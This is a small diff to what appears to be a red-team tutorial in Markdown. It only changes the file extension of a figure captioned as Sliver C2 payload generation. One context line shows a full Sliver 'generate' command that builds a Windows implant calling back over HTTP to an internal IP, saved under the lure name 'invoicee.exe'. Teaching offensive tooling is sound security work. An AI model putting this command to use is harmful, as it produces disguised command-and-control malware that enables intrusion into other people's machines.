@@ -37,7 +37,7 @@ generate --http 192.168.1.101:80 --save /opt/invoicee.exe --os windows
 ```
 
 <p align="center">
-  <img src="images/generate.jpg" alt="Sliver C2 payload creation command" width="800">
+  <img src="images/generate.png" alt="Sliver C2 payload creation command" width="800">
 </p>
 <p align="center">
   <em>Figure 1: Sliver C2 payload generation and command execution.</em>
